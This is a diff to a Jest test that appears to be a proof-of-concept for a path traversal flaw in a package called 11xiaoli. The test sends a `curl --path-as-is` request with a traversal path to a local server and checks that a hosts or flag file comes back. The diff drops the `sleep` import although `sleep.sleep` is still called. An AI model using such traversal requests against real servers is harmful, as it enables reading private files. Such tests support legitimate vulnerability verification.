@@ -1,6 +1,5 @@
 //
 const path = require("path");
-const { sleep } = require("sleep");
 const pathToFlag = path.resolve(__dirname, "../flag.html");
 
 function genstr(n) {
@@ -19,10 +18,13 @@ test("Path Traversal in 11xiaoli", (done) => {
   sleep.sleep(2);
   let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;
 
-  exec(attack_string, (error, stdout) => {
+let val=  exec(attack_string, (error, stdout) => {
     //attack
-    expect(stdout).toBe(hostsFile);
-
+    let out = false;
+    if (stdout.includes(hostsFile)) {
+      out = true;
+    }
+    expect(out).toBe(true);
     done();
   });
-});
+},30000);
